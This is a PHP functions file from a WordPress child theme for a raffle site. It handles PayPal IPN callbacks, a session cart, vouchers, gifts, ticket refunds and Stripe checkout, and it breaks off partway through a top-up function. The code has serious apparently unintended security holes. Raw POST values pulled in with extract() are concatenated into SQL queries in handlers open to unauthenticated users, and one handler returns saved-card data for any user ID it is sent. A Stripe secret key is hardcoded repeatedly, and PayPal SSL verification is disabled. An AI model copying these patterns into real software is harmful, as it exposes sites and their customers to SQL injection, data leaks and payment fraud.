<?php
use Elementor\Widget_Html;
require_once('libs/stripe/init.php');
/**
 * Child Theme functions loads the main theme class and extra options
 *
 * @package Swatch Child
 * @subpackage Child
 * @since 1.3
 *
 * @copyright (c) 2013 Oxygenna.com
 * @license http://wiki.envato.com/support/legal-terms/licensing-terms/
 * @version 1.0
 */

// include extra theme specific code
//include OXY_THEME_DIR . 'inc/frontend.php';


function oxy_load_child_scripts()
{
    wp_enqueue_style('child-style', get_stylesheet_directory_uri() . '/style.css', array(THEME_SHORT . '-theme'), false, 'all');
}
add_action('wp_enqueue_scripts', 'oxy_load_child_scripts');

function register_my_session()
{
  if( !session_id() )
  {
    session_start();
  }
}


add_action( 'init', 'paypal_ipn' );
function paypal_ipn() {
		
    global $wp;
	
    if (isset($_GET['action']) && $_GET['action']=='winner_IPN') {
        if(check_ipn()) {
		 
            ipn_request($IPN_status = true);
        
        } else {
        
            ipn_request($IPN_status = false);
        }
	
     }
 
}

function check_ipn() {
 
     $ipn_response = !empty($_POST) ? $_POST : false;
 
     if ($ipn_response == false) {
        
         return false;
        
     }
 
     if ($ipn_response && check_ipn_valid($ipn_response)) {
 
         header('HTTP/1.1 200 OK');
 
         return true;
     }
}

function check_ipn_valid($ipn_response) {
 
     $paypal_adr = 'https://ipnpb.sandbox.paypal.com/cgi-bin/webscr'; // sandbox mode
     
     // use https://ipnpb.paypal.com/cgi-bin/webscr for live
     
     // Get received values from post data
     
     $validate_ipn = array('cmd' => '_notify-validate');
  
     $validate_ipn += stripslashes_deep($ipn_response);
 
     // Send back post vars to paypal
 
     $params = array(
         'body' => $validate_ipn,
         'sslverify' => false,
         'timeout' => 60,
         'httpversion' => '1.1',
         'compress' => false,
         'decompress' => false,
         'user-agent' => 'paypal-ipn/'
      );
 
      // Post back to get a response
 
      $response = wp_safe_remote_post($paypal_adr, $params);
 
      // check to see if the request was valid
 
      if (!is_wp_error($response) && $response['response']['code'] >= 200 && $response['response']['code'] < 300 && strstr($response['body'], 'VERIFIED')) {
 
          return true;
 
      }
 
      return false;
 
}

function ipn_request($IPN_status) {
		
     $ipn_response = !empty($_POST) ? $_POST : false;
 
     $ipn_response['IPN_status'] = ( $IPN_status == true ) ? 'Verified' : 'Invalid';
 
     $posted = stripslashes_deep($ipn_response);
	
 	$myfile = fopen("newfileNowUpdatetxt", "w") or die("Unable to open file!");
                        $txt = json_encode($posted);
                        fwrite($myfile, $txt);
	
	$item_number    = $posted['item_number']; 
    $txn_id         = $posted['txn_id']; 
    $payment_gross     = $posted['mc_gross']; 
    $currency_code     = $posted['mc_currency']; 
    $payment_status = $posted['payment_status']; 

	$item_name = $posted['item_name'];
	if($item_name == 'Topup Amount'){
		$item_name = "topup_balance";
		$order_id  = 0 ;
		$user = $item_number;
	}else{
		$item_name = "order_purchase";
		 $amount = "";
		 $user = 0;
		$order_id = $item_number;
	}
    
    // Get product info from the database 
     global $wpdb;
    // Check if transaction data exists with the same TXN ID.
    $prevPaymentResult  = $wpdb->get_results("SELECT * FROM PQrlH_transactions WHERE trans_id = '".$txn_id."'"); 
	
    if(count($prevPaymentResult) > 0){ 
        
    }else{ 
        // Insert transaction data into the database 
		if($payment_status == 'Completed'){
			$payment_status = 'paid';
		}
		$order_from = $wpdb->get_var("select order_from from PQrlH_orders where ord_id = $item_number ");
        $insert = $wpdb->query("INSERT INTO PQrlH_transactions(trans_id,user_id,currency,price,payment_method,payment_status,order_id,payment_type,status_web) 		VALUES('".$txn_id."',$user,'".$currency_code."',$payment_gross,'paypal','".$payment_status."',$order_id,'".$item_name."','".$order_from."')"); 
		if($item_name ==  'order_purchase'){
		$userid = 	$wpdb->get_var("select user_id from PQrlH_orders where ord_id = ".$order_id);
		$charity =  get_user_meta($userid,'charity',true);
		$insert = $wpdb->query("INSERT INTO PQrlH_transactions(trans_id,user_id,currency,price,payment_method,payment_status,order_id,payment_type,status_web) 		VALUES('".$txn_id."',$userid,'".$currency_code."',(5*$payment_gross)/100,'paypal','".$payment_status."',$charity,'charity_fund','".$order_from."')"); 
		$payment_id = $wpdb->insert_id; 
		$wpdb->update('PQrlH_orders',array("status" => "paid"),array("ord_id"=>$order_id));
		}
		
    } 
	
}



add_action('init', 'register_my_session');

add_action("wp_footer",'sw_scripts');
function sw_scripts(){
	wp_enqueue_script('prelaoder-js',get_stylesheet_directory_uri().'/js/jquery.preloaders.js');
	wp_enqueue_script('stripe-js','https://js.stripe.com/v3/');
    wp_enqueue_script('custom-js',get_stylesheet_directory_uri().'/js/custom.js');
    $arrayData = array(
        "ajax_url" => admin_url("admin-ajax.php"),
		"theme_url" => get_template_directory_uri().'/imgs/',
    );
    wp_localize_script("custom-js","js_data", $arrayData);
}



add_action("wp_ajax_get_charities",'get_charities');
add_action("wp_ajax_nopriv_get_charities",'get_charities');
function get_charities(){
	 
	$taxonomy     = 'charity_category';
	$orderby      = 'name';  
	$show_count   = 0;      // 1 for yes, 0 for no
	$pad_counts   = 0;      // 1 for yes, 0 for no
	$hierarchical = 1;      // 1 for yes, 0 for no  
	$title        = '';  
	$empty        = 0;

	$args = array(
		'taxonomy'     => $taxonomy,
		'orderby'      => $orderby,
		'show_count'   => $show_count,
		'pad_counts'   => $pad_counts,
		'hierarchical' => $hierarchical,
		'title_li'     => $title,
		'hide_empty'   => $empty
	);
	$all_categories = get_categories( $args );
	$charities = array();
	foreach ($all_categories as $cat) {
	  		  	
	  	$charity['cat_id'] =$cat->term_id;
		$charity['cat_name'] = $cat->name;
		$charities[] = $charity;
	}
	$response['error'] =  false;
	$response['charities'] =  $charities;
	echo json_encode($response);
	die;
}



add_action("wp_ajax_add_to_cart",'add_to_cart');
add_action("wp_ajax_nopriv_add_to_cart",'add_to_cart');
function add_to_cart(){
    extract($_POST);
    $response = array();
    global $wpdb;
  
    if(!isset($_SESSION['cart'])){
        $_SESSION['cart'] = array();
    }
    
    // add new item on array
        $cart_item=array(
            'quantity'=>$qty,
			'color'=>$bgcolor,
			'charity'=>$charity
        );
        if(array_key_exists($raffle, $_SESSION['cart'])){
            $_SESSION['cart'][$raffle]['quantity']=$qty;
        }else{
            $_SESSION['cart'][$raffle]=$cart_item;
        }

    /*if(array_key_exists($raffle, $_SESSION['cart'])){

        $_SESSION['cart'][$raffle]['qty']=$_SESSION['cart'][$raffle]['qty'] + $qty;
        
    }else{

    $_SESSION['cart'][] = array(
        'raffle_id' => $raffle,
        'qty' => $qty,
        'amount' => ''
       );
    }*/
   // print_r($_SESSION['cart']);
   $response['error'] =  false;
   $response['msg'] = "Added";
   $response['total_items']   = count($_SESSION['cart']);

   
   echo json_encode($response);

    wp_die();

}
//require_once('libs/stripe/init.php');
add_action("wp_ajax_remove_from_cart",'remove_from_cart');
add_action("wp_ajax_nopriv_remove_from_cart",'remove_from_cart');
function remove_from_cart(){
    extract($_POST);
    $response = array();
    global $wpdb;
  
    if(!isset($_SESSION['cart'])){
        $_SESSION['cart'] = array();
    }
    
        if(array_key_exists($raffle, $_SESSION['cart'])){
            unset($_SESSION['cart'][$raffle]);
        }

    /*if(array_key_exists($raffle, $_SESSION['cart'])){

        $_SESSION['cart'][$raffle]['qty']=$_SESSION['cart'][$raffle]['qty'] + $qty;
        
    }else{

    $_SESSION['cart'][] = array(
        'raffle_id' => $raffle,
        'qty' => $qty,
        'amount' => ''
       );
    }*/
   //print_r($_SESSION['cart']);
   $response['error'] =  false;
   $response['msg'] = "removed";
   $response['total_items']   = count($_SESSION['cart']);

   
   echo json_encode($response);

    wp_die();

}

add_action( 'admin_menu', 'raffle_tickets_menu' );
function raffle_tickets_menu(){
	 add_menu_page("Raffle Tickets","Raffle Tickets","administrator","raffle_tickets","raffle_tickets_page",'dashicons-text-page',8);
	add_submenu_page( 
          null            // -> Set to null - will hide menu link
        , 'Raffle All Tickets'    // -> Page Title
        , 'Raffle All Tickets'    // -> Title that would otherwise appear in the menu
        , 'administrator' // -> Capability level
        , 'raffle_all_tickets'   // -> Still accessible via admin.php?page=menu_handle
        , 'raffle_all_tickets' // -> To render the page
    );
}


function raffle_tickets_page(){
		require_once('templates/raffle_tickets.php');
}
function raffle_all_tickets(){
		require_once('templates/raffle_all_tickets.php');
	}


add_action( 'admin_menu', 'voucher_menu' );
function voucher_menu(){
	 add_menu_page("Vouchers","Vouchers","administrator","voucher","voucher_page",'dashicons-money-alt',5);
	}

function voucher_page(){
		require_once('templates/voucher_admin.php');
	}

add_action( 'admin_menu', 'order_menu' );
function order_menu(){
	 add_menu_page("Orders","Orders","administrator","new_order","order_page",'dashicons-cart',5);
	}

function order_page(){
		require_once('templates/orders_admin.php');
	}

add_action( 'admin_menu', 'transactions' );
function transactions(){
	 add_menu_page("All Transactions","Transactions","administrator","all_transaction","all_transaction_menu",'dashicons-money-alt',5);
	}

function all_transaction_menu(){
		require_once('templates/all_transaction.php');
	}


add_action( 'admin_menu', 'winnerwish_notifywinner' );
/// winnerish Noftify Winner
	function winnerwish_notifywinner(){
		add_submenu_page("edit.php?post_type=competition-winners","notify_winner","Notify Winner","administrator","notify_winner","notify_winner_page");
	}
	
	function notify_winner_page(){
		require_once('templates/notify_winner.php');
	}

add_action( 'admin_menu', 'winnerwish_subscribed' );
/// winnerish Subscribed Users
	function winnerwish_subscribed(){
		add_submenu_page("edit.php?post_type=winner-subscriptions","subscribed_users","Subscribed Users","administrator","subscribed_users","subscribed_users_page");
	}
	
	function subscribed_users_page(){
		require_once('templates/subscribed_users.php');
	}

add_action('admin_post_notify_comp_winner','notify_comp_winner');
function notify_comp_winner(){
	 global $wpdb;
	extract($_POST);
	$subject = "Congratulations You Won!"; 
	$htmlContent = '<div style="max-width: 560px; padding: 20px; background: #ffffff; border-radius: 5px; margin: 40px auto; font-family: Open Sans,Helvetica,Arial; font-size: 15px; color: #666;">
<div style="color: #444444; font-weight: normal;">
<div style="text-align: center; font-weight: 600; font-size: 26px; padding: 10px 0; border-bottom: solid 3px #eeeeee;"><img class="attachment-full size-full" src="<?php echo site_url();?>/wp-content/uploads/2020/12/Group-66-1.png" alt="logo" width="168" height="87" /></div>
<div style="text-align: center; font-weight: 600; font-size: 26px; padding: 10px 0; border-bottom: solid 3px #eeeeee;">Winners Wish</div>
<div style="clear: both;"> </div>
</div>
<div style="padding: 0 30px 30px 30px; border-bottom: 3px solid #eeeeee;">
<div style="padding: 30px 0; font-size: 24px; text-align: center; line-height: 40px;">Dear !<span style="display: block;">'.$winner_name.'</span></div>
<div style="padding: 30px 0; font-size: 24px; text-align: center; line-height: 40px;">Congratulations!<span style="display: block;">You won the competition('.$comp_name.').</span></div>
<div style="padding: 10px 0 50px 0; text-align: center;"><a style="background: #555555; color: #fff; padding: 12px 30px; text-decoration: none; border-radius: 3px; letter-spacing: 0.3px;" href="{login_url}">Login to our site</a></div>
<div style="padding: 20px;">If you have any problems, please contact us at <a style="color: #3ba1da; text-decoration: none;" href="mailto:{admin_email}">{admin_email}</a></div>
</div>
<div style="color: #999; padding: 20px 30px;">
<div>Thank you!</div>
<div>The <a style="color: #3ba1da; text-decoration: none;" href="{site_url}">{site_name}</a> Team</div>
</div>
</div>';
	// Set content-type header for sending HTML email 
$headers = "MIME-Version: 1.0" . "\r\n"; 
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 
// Additional headers 
$headers .= 'From: winnerwish.com <Winnerswish>' . "\r\n"; 
	
	if(mail($winner_email, $subject, $htmlContent, $headers)){ 
		$_SESSION['email_notified'] = 'yes' ;
	}else{ 
	   $_SESSION['email_notified'] = 'no'; 
	}
	
	wp_redirect(site_url().'/wp-admin/edit.php?post_type=competition-winners&page=notify_winner');
	exit;
}


add_action('admin_post_save_voucher','save_voucher');
function save_voucher(){
    global $wpdb;
$vname =  $_POST['vname'];
$vlimit =  $_POST['vlimit'];
$vprice =  $_POST['vprice'];
$vexpiry =  $_POST['vexpiry'];
$check =  $wpdb->insert('pqrlh_vouchers',array("vname"=>$vname,"vlimit"=>$vlimit,'vprice'=>$vprice,'vexpiry'=>$vexpiry));
    if($check){
        wp_redirect(site_url().'/wp-admin/admin.php?page=voucher&status=success');
		exit;
    }else{
        $wpdb->print_error();
        echo "error";
    }

}

add_action('admin_post_delete_voucher','delete_voucher');
function delete_voucher(){
    global $wpdb;
$v_id =  $_POST['vid'];
$check =  $wpdb->delete('pqrlh_vouchers',array("vid"=>$v_id));
    if($check){
        wp_redirect(site_url().'/wp-admin/admin.php?page=voucher&status=deleted');
		exit;
    }else{
        $wpdb->print_error();
        echo "error";
    }

}
/// Send Gift to User	
add_action('admin_post_send_gift','send_gift');
function send_gift(){
    global $wpdb;
	
	extract($_POST);
	$single_price =  get_post_meta( $raffle, 'price_of_single_ticket', true );
	$total = $single_price*$tickets;
	$array = array(
		"userid"=>$userid,
		"gift_type"=>$gifttype,
		"amount"=>$amount,
		"tickets"=>$tickets,
		 "raffle_id"=>$raffle,
		"description"=>$optional_desc
	);
	$user = get_userdata($userid);
	$email = $user->user_email;
	$insert =  $wpdb->insert('PQrlH_user_gifts',$array);
		if($insert){
			if($gifttype == 'balance'){
				/// Deduct from Admin 
				$transaction = array(
								"trans_id"=> 'Trx_WW_admin',
								"currency"=>'GBP',
								"price"=>"-".$amount,
								'user_id'=>0,
								"payment_method"=>'Balance',
								"payment_status"=>"paid",
								"order_id"=>0,
								"payment_type"=>'gift'
							);
						$insert_admin =$wpdb->insert('PQrlH_transactions',$transaction);
				/// add to customer top up
				$transaction = array(
								"trans_id"=> 'Trx_WW_admin',
								"currency"=>'GBP',
								"price"=>$amount,
								'user_id'=>$userid,
								"payment_method"=>'Balance',
								"payment_status"=>"paid",
								"order_id"=>0,
								"payment_type"=>'gift'
							);
						$insertcustomer =$wpdb->insert('PQrlH_transactions',$transaction);
			     if($insert_admin && $insertcustomer){
					 gift_mail($email,$gifttype,$amount,$raffle);
					 $_SESSION['gift_send'] =  'Yes';
				 wp_redirect(site_url().'/wp-admin/users.php?page=user_gifts&UID='.$userid);
				exit;
				 }else{
					 $wpdb->print_error();
					echo "error in balance transactions";
				 }
			}else{
				
				$insert = $wpdb->insert('PQrlH_orders',array(
				   'total_price'=>$total,
				   'sub_total'=>$total,
				   'user_id'=>$userid,
				   'lotteries'=>$raffle,
				   'lotteries_answers'=>'true',
				   'payment_method'=>'Balance',
				   'status'=>'pending',
					'type'=>'gift'
			   ));
				if($insert){
					$lastid = $wpdb->insert_id;
					$query = "INSERT INTO PQrlH_order_details (`order_id`,`ticket`,`lottery_id`,`security_question`) values";
					for($i = 1 ; $i<= $tickets;$i++){

						$ticket = "WW-".$user.generateRandomString(4);
						$query .="($lastid,'$ticket',$raffle,'true'),";

					}
					$query = trim($query,',');

					if($wpdb->query($query)){
						$transaction = array(
								"trans_id"=> 'Trx_WW_admin'.$lastid,
								"currency"=>'GBP',
								"price"=>"-".$total,
								'user_id'=>0,
								"payment_method"=>'Balance',
								"payment_status"=>"paid",
								"order_id"=>$lastid,
								"payment_type"=>'gift'
							);
						$insert_admin =$wpdb->insert('PQrlH_transactions',$transaction);
						if($insert_admin){
							gift_mail($email,$gifttype,$amount,$raffle);
							 $_SESSION['gift_send'] =  'Yes';
							 wp_redirect(site_url().'/wp-admin/users.php?page=user_gifts&UID='.$userid);
							exit;
						}else{
							$wpdb->print_error();
							echo "error";
						}
					}
				}
			
			}
		}else{
			$wpdb->print_error();
			echo "error in sending Gift";
		}

	}
// Delete ticket
add_action('admin_post_delete_ticket','delete_ticket');
function delete_ticket(){
    global $wpdb;
	$ticketid =  $_POST['ticketid'];
	$order_id = $wpdb->get_row('select * from PQrlH_order_details where id = '.$ticketid);
	$user_id = $wpdb->get_var('select user_id from PQrlH_orders where ord_id = '.$order_id->order_id);
	$total = get_post_meta( $order_id->lottery_id, 'price_of_single_ticket', true );
	$userdetail =get_userdata($user_id);
	
	$check =  $wpdb->delete('PQrlH_order_details',array("id"=>$ticketid));
    if($check){
		
				$transaction = array(
					"trans_id"=> 'Trx_WW_admin'.$ticketid,
					"currency"=>'GBP',
					"price"=>"-".$total,
					'user_id'=>0,
					"payment_method"=>'Balance',
					"payment_status"=>"paid",
					"order_id"=>$order_id->order_id,
					"payment_type"=>'refund'
				);
			$insert_admin =$wpdb->insert('PQrlH_transactions',$transaction);
				$transaction = array(
					"trans_id"=> 'Trx_WW_User'.$ticketid,
					"currency"=>'GBP',
					"price"=>$total,
					'user_id'=>$user_id,
					"payment_method"=>'Balance',
					"payment_status"=>"paid",
					"order_id"=>$order_id->order_id,
					"payment_type"=>'refund'
				);
		$insert_user =$wpdb->insert('PQrlH_transactions',$transaction);
		$notification = array(
					"not_text"=> 'Your requested ticket('.$order_id->ticket.') is deleted and amount refunded to your balance',
					"user_id"=>$user_id,
					"is_read"=>'no'
				);
		$insert_notification = $wpdb->insert('PQrLH_notifications',$notification);
		if($insert_user && $insert_admin){
			
			$to = $userdetail->user_email; 
			$from = 'Winnerwish@support.com'; 
			$fromName = 'WinnersWish'; 

			$subject = "Ticket Deleted and amount refunded"; 

$message = '<div style="max-width: 560px; padding: 20px; background: #ffffff; border-radius: 5px; margin: 40px auto; font-family: Open Sans,Helvetica,Arial; font-size: 15px; color: #666;">
		<div style="color: #444444; font-weight: normal;">
		<div style="text-align: center; font-weight: 600; font-size: 26px; padding: 10px 0; border-bottom: solid 3px #eeeeee;">Winnerswish</div>
		<div style="clear: both;"> </div>
		</div>
		<div style="padding: 0 30px 30px 30px; border-bottom: 3px solid #eeeeee;">
		<div style="padding: 30px 0; font-size: 16px; text-align: center; line-height: 40px;">Your Ticket Deleted successfully! And amount refunded to your wallet.</div>
		<div style="padding: 10px 0 20px 0; text-align: center;"><a style="background: #555555; color: #fff; padding: 12px 20px; text-decoration: none; border-radius: 3px; letter-spacing: 0.3px;" href="<?php echo site_url();?>">Go to your Account</a></div>
		<div style="padding: 15px; background: #eee; border-radius: 3px; text-align: center;">If you have any query, please <a style="color: #3ba1da; text-decoration: none;" href="mailto:{admin_email}">contact us</a> ASAP.</div>
		</div>
		<div style="color: #999; padding: 20px 30px;">
		<div>Thank you!</div>
		<div>The <a style="color: #3ba1da; text-decoration: none;" href="<?php echo site_url(); ?>">Winnerswish</a> Team</div>
		</div>
		</div>'; 

			// Additional headers 
			$headers = 'From: '.$fromName.'<'.$from.'>'; 
			// Set content-type header for sending HTML email 
			$headers = "MIME-Version: 1.0" . "\r\n"; 
			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 
			// Send email 
			if(mail($to, $subject, $message, $headers)){ 
			$_SESSION['ticket_deleted'] = "yes";
			wp_redirect(site_url().'/wp-admin/admin.php?page=raffle_all_tickets&Raff=2015');
			exit;
			}else{
				$_SESSION['ticket_deleted_mail'] = "no";
				wp_redirect(site_url().'/wp-admin/admin.php?page=raffle_all_tickets&Raff=2015');
				exit;
			}
		}else{
			$_SESSION['ticket_deleted'] = "no";
        wp_redirect(site_url().'/wp-admin/admin.php?page=raffle_all_tickets&Raff=2015');
		exit;
		}
    }else{
        $wpdb->print_error();
		$_SESSION['ticket_deleted'] = "no";
        wp_redirect(site_url().'/wp-admin/admin.php?page=raffle_all_tickets&Raff=2015');
		exit;
    }

}

require('winner_functions.php');
$winner_functions = new Winner_Wish();

add_filter( 'simpay_form_1507_amount', 'simpay_custom_amount',10,3);
function simpay_custom_amount($value) {
	return $value;
}

add_action("wp_ajax_check_voucher",'check_voucher');
add_action("wp_ajax_nopriv_check_voucher",'check_voucher');
function check_voucher(){
	
	extract($_POST);
    $response = array();
    global $wpdb;
	
	$get_row = $wpdb->get_row("select * from pqrlh_vouchers where vname = '$code'");
	
	if(!empty($get_row)){
		
			$startdate = $get_row->vexpiry;
			$expire = strtotime($startdate);
			$today = time();

			if($today >= $expire){
				$response['error'] =  true;
     			$response['error_msg'] = "Voucher Expired!";
			} else {
				
				if($get_row->vlimit == $get_row->voucher_usage){
					
					$response['error'] =  true;
     			    $response['error_msg'] = "Voucher reached the limit!";
				
				}else{
				
					$response['error'] =  false;
     				$response['success_msg'] = $get_row->vprice."%  Off";
					$response['voucher_detail'] = $get_row;
				
				}
				
				
			}
	
	
	}else{
	
	 $response['error'] =  true;
     $response['error_msg'] = "Invalid Voucher Code!";
	
	}
	
	echo json_encode($response);
	wp_die();
	
}



add_action("wp_ajax_get_saved_cards",'get_saved_cards');
add_action("wp_ajax_nopriv_get_saved_cards",'get_saved_cards');
function get_saved_cards(){
	
	extract($_POST);
    $response = array();
    global $wpdb;
	
	$get_user_info = $wpdb->get_row("select stripe_customer_id from PQrlH_userDetails where user_id=".$userid); 
	// Set API key 
    //\Stripe\Stripe::setApiKey('');   
	$stripe = new \Stripe\StripeClient(
	  'sk_test_51H4QdgGmT7c3r5SQbt2GrPhzrLa1WMp7my7B9YsBAS0biYPV5cwYuxuuto5DumbhzfuhTo3WKCBsRDW19tDZJKuY00Xrrsauzm'
	);
	if($get_user_info->stripe_customer_id != ""){
	
	$stripe_customer = $stripe->customers->retrieve(
		 $get_user_info->stripe_customer_id
		);
     //print_r($cardSource);		
	 $cardSource = $stripe_customer->sources;
	  $cards = $cardSource->data;
		$cardss = array();
		foreach($cards as $card){
			$cardsss['brand'] =  $card->brand;
			$cardsss['last4'] =  $card->last4;
			$cardss[] = $cardsss;
		}
		
			$response['error'] = false;
			$response['cards'] = $cardss;
			$response['success_msg'] = "Card Found!";
		
	}else{
		
			$response['error'] = true; 
			$response['error_msg'] = "No Card added before!";
	
	}
	
	echo json_encode($response);
	die;
}
	
	
add_action("wp_ajax_place_order",'place_order');
add_action("wp_ajax_nopriv_place_order",'place_order');
function place_order(){
	
	extract($_POST);
    $response = array();
    global $wpdb;
	$userdetails = wp_get_current_user();
	
	 $user =  $userdetails->ID;
	
	
	if($payment_method == "balance"){
	
		$balance = $wpdb->get_var("SELECT SUM(price) as balance FROM `PQrlH_transactions` where user_id = $user");
		
		if($total > $balance){
			
				$response['error'] = true; 
				$response['error_msg'] = "Invalid Balance";
			    echo json_encode($response);
				die;
		}
	
	}
	
	if($already_saved != ""){
	
			$already = $already_saved;
	
	}else{
	
		$already = "add_new";
	
	}
	
	 
	 $user_email =  $userdetails->user_email;
	//print_r($userdetails);
	//die;
	//$user  =  get_current_user_id();
	
	$single_price = 0;
	foreach($_SESSION['cart'] as $key=>$val){
		$single =  get_post_meta($key,'price_of_single_ticket',true);
		$single_price += $single*$val['quantity'];
		$charity = $val['charity'];
	}
	
	if(get_user_meta( $user, 'charity',true) == ""){
	add_user_meta( $user, 'charity', $charity ,true );
	}
	
	if($voucher == ""){
		
		$subtotal = $single_price;
	    $total = $single_price;
	}else{
		
		$subtotal  = $single_price;
		$voucher = $wpdb->get_row("SELECT * FROM `pqrlh_vouchers` where vlimit != voucher_usage AND vexpiry > NOW() AND vname = '$voucher'");
		$total =  $subtotal - ($subtotal * $voucher->vprice) / 100 ;
		
		$update = $wpdb->update("Update pqrlh_vouchers SET voucher_usage = voucher_usage + 1 WHERE vname='$voucher'");
		
	}
	   $lottires = trim($lottries,',');
	   $security_ans = trim($security_ans,',');
	   $insert = $wpdb->insert('PQrlH_orders',array(
		   'total_price'=>$total,
		   'sub_total'=>$subtotal,
		   'user_id'=>$user,
		   'lotteries'=>$lottires,
		   'lotteries_answers'=>$security_ans,
		   'payment_method'=>$payment_method,
		   'status'=>'pending'
	   ));
	if($insert){
		
		$lastid = $wpdb->insert_id;
		
		foreach($order_detail as $order){
			
			$lottry_id = $order['lottry_id'];
			$sec_answer = $order['sec_answer'];
			$query = "INSERT INTO PQrlH_order_details (`order_id`,`ticket`,`lottery_id`,`security_question`) values";
			for($i = 1 ; $i<= $order['quantity'];$i++){
				
				$ticket = "WW-".$user.generateRandomString(4);
				$query .="($lastid,'$ticket',$lottry_id,'$sec_answer'),";
				
			}
			 $query = trim($query,',');
			
			if($wpdb->query($query)){
				
				if($voucher != ""){
					
					$wpdb->insert('PQrlH_voucher_usage',array('voucher_id'=>$voucher->vid,'voucher_price'=>$voucher->vprice,'order_id'=>$lastid,'user_id'=>$user));
				}
				
				$status = true;
			}else{
				$status = false;
			}

		}
	
		if($status){
			
			if($payment_method == "paypal"){
				 $vars = array(
						'cmd' => '_xclick',
						'business' => "winnerwish-business@gmail.com",
						'lc'=>'EN_US',
						'item_name' => "Winner Wish",
						'item_number' => $lastid,
					    'userid' => $user,
						'amount' => $total,
						'notify_url' => site_url()."/?action=winner_IPN",
						'return' => site_url()."/confirmation",
						'currency_code' => 'GBP',
					 	'order_id'=>$lastid,
						'cancel_return' => site_url(),
						'paymentaction' => 'sale',
						'no_note' => 0,
						'tax_rate' => 0,
				);
				$response['payment_url'] = "https://www.sandbox.paypal.com/cgi-bin/webscr?" . http_build_query($vars);
				$response['error'] = false; 
				$response['success_msg'] = "Order Placed Successfully......";
				unset ($_SESSION["cart"]);
			}else if($payment_method == 'cards'){
				$token = $_POST['token_id'];
				if($token == ""){
					$token = "saved_card";
				}
				//echo json_encode(place_order_stripe($token,$user_email,$total,$lastid,$user,$already));
				\Stripe\Stripe::setApiKey('sk_test_51H4QdgGmT7c3r5SQbt2GrPhzrLa1WMp7my7B9YsBAS0biYPV5cwYuxuuto5DumbhzfuhTo3WKCBsRDW19tDZJKuY00Xrrsauzm');
				$checkout_session = \Stripe\Checkout\Session::create([
				  'payment_method_types' => ['card'],
				  'line_items' => [[
					'price_data' => [
					  'currency' => 'gbp',
					  'unit_amount' => $total*100,
					  'product_data' => [
						'name' => 'Winner Wish Competition',
						'images' => [site_url()."/wp-content/uploads/2020/12/Group-66-1.png"],
					  ],
					],
					'quantity' => 1,
				  ]],
				  'mode' => 'payment',
				  'metadata'=>['order_id'=>$lastid,'userid'=>$user],
				  'success_url' => site_url().'/customthankyou/',
				  'cancel_url' => site_url(),
				]);
				echo json_encode(['id' => $checkout_session->id,"error"=>false]);
				unset ($_SESSION["cart"]);
				die;
			}else if($payment_method == 'balance'){
				// Insert tansaction data into the database 
                $transaction = array(
					"trans_id"=> 'txid_balance_'.$lastid,
					"currency"=>'GBP',
					"price"=>"-".$total,
					'user_id'=>$user,
					"payment_method"=>$payment_method,
					"payment_status"=>"paid",
					"order_id"=>$lastid,
					"payment_type"=>'order_purchase'
				);
				$insert =$wpdb->insert('PQrlH_transactions',$transaction);
				$transaction = array(
					"trans_id"=> 'txid_balance_'.$lastid,
					"currency"=>'GBP',
					"price"=>$total,
					'user_id'=>0,
					"payment_method"=>$payment_method,
					"payment_status"=>"paid",
					"order_id"=>$lastid,
					"payment_type"=>'order_purchase'
				);
				
                $insert =$wpdb->insert('PQrlH_transactions',$transaction);
				$charity =  get_user_meta($user,'charity',true);
				$transaction = array(
					"trans_id"=> 'txid_balance_'.$lastid,
					"currency"=>'GBP',
					"price"=>(5*$total)/100,
					'user_id'=>$user,
					"payment_method"=>$payment_method,
					"payment_status"=>"paid",
					"order_id"=>$charity,
					"payment_type"=>'charity_fund'
				);
				
                $insert =$wpdb->insert('PQrlH_transactions',$transaction);
				
				if($insert){
					$wpdb->update('PQrlH_orders',array("status" => "paid"),array("ord_id"=>$order_id));
					$response['error'] = false; 
					$response['success_msg'] = "Order Placed Successfully......";
					unset ($_SESSION["cart"]);
				
				}else{
					
					$response['error'] = true; 
					$response['error_msg'] = "Something went wrong while placing order......";
				
				}
			
			}
			
			
		}else{
		
			$response['error'] = true; 
			$response['error_msg'] = "Error in Ordering while inserting details Try Later......";
			
		}
	}else{
	
		$response['error'] = true; 
		$response['error_msg'] = "Error in Ordering Try Later......"; 
	
	}
	//echo 
	echo json_encode($response);
	wp_die();
}


add_action("wp_ajax_place_subscription",'place_subscription');
add_action("wp_ajax_nopriv_place_subscription",'place_subscription');
function place_subscription(){
	extract($_POST);
    $response = array();
    global $wpdb;
	$userdetails = wp_get_current_user();
	
	$user =  $userdetails->ID;
	 $amount = get_post_meta($package_id,'subscription_price',true);
		  \Stripe\Stripe::setApiKey('sk_test_51H4QdgGmT7c3r5SQbt2GrPhzrLa1WMp7my7B9YsBAS0biYPV5cwYuxuuto5DumbhzfuhTo3WKCBsRDW19tDZJKuY00Xrrsauzm');
				$checkout_session = \Stripe\Checkout\Session::create([
				  'payment_method_types' => ['card'],
				  'line_items' => [[
					'price_data' => [
					  'currency' => 'gbp',
					  'unit_amount' => $amount*100,
					  'product_data' => [
						'name' => 'Winner Wish Subscription',
						'images' => [site_url()."/wp-content/uploads/2020/12/Group-66-1.png"],
					  ],
					],
					'quantity' => 1,
				  ]],
				  'mode' => 'payment',
				  'metadata'=>['order_id'=>$package_id,'userid'=>$user,'type'=>'subscription'],
				  'success_url' => site_url().'/customthankyou/',
				  'cancel_url' => site_url(),
				]);
				echo json_encode(['id' => $checkout_session->id,"error"=>false]);
				wp_die();
}


add_action("wp_ajax_topup",'topup');
add_action("wp_ajax_nopriv_topup",'topup');
function topup($token){

	extract($_POST);
    $response = array();
    global $wpdb;
	$userdetails = wp_get_current_user();
	
	 $user =  $userdetails->ID;
	//$charity = get_user_meta( $userid, 'charity',true)
	$get_other_user_info = $wpdb->get_row("select * from PQrlH_userDetails where user_id=".$user); 
	\Stripe\Stripe::setApiKey('sk_test_51H4QdgGmT7c3r5SQbt2GrPhzrLa1WMp7my7B9YsBAS0biYPV5cwYuxuuto5DumbhzfuhTo3WKCBsRDW19tDZJKuY00Xrrsauzm');      
    // Add customer to stripe 
	
	if($get_other_user_info->stripe_customer_id == ""){
		try {  
			$customer = \Stripe\Customer::create(array( 
				'email' => $email, 
				'source'  => $token 
			)); 
		}catch(Exception $e) {  
			$api_error = $e->getMessage();  
		} 
		
		$customerid = $customer->id;
	}else{
		
		$customerid = $get_other_user_info->stripe_customer_id;
		$api_error = "";
		if($already == 'add_new'){
		
			\Stripe\Customer::update($customerid, [
				'source' => $token,
			]);
		}
	}
	
	
